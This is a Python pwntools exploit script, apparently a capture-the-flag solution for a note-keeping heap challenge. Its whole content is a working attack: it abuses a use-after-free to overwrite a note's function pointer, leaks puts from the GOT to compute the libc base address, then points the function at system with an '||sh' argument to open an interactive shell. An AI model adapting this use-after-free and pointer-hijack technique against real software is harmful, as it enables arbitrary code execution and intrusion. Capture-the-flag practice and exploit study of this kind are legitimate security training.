#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
context.update(binary=elf, log_level="debug")
p = elf.process()
# gdb.attach(
#     p,
#     """
#     b *0x8048a77
#     b *0x8048a7e
#  	b *0x8048a85
# """,
# )
# p = remote('chall.pwnable.tw', '10102')


def addNote(size, content):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Note size :", str(size).encode())
    p.sendafter(b"Content :", content)
    p.recvuntil(b"Success !")


def deleteNote(index):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index :", str(index).encode())
    p.recvuntil(b"Success")


def printNote(index):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(index).encode())


addr_print_note = 0x0804862B  # return puts(note->content)
# leak libc
addNote(16, b"A" * 8)  # idx = 0
addNote(16, b"B" * 8)  # idx = 1
deleteNote(0)
deleteNote(1)
addNote(8, p32(addr_print_note) + p32(elf.got["puts"]))
# freed and now located idx = 2 but can print content of idx 0
printNote(0)
puts_libc = u32(p.recv(4))
libc.address = puts_libc - libc.symbols["puts"]
system = libc.symbols["system"]
log.success("Addr puts libc:   " + hex(puts_libc))
log.success("Addr libc base:   " + hex(libc.address))
log.success("Addr system libc: " + hex(system))

# get shell
deleteNote(2)  # delete to reallocated idx 2
addNote(8, p32(system) + b"||sh")
printNote(0)

p.interactive()
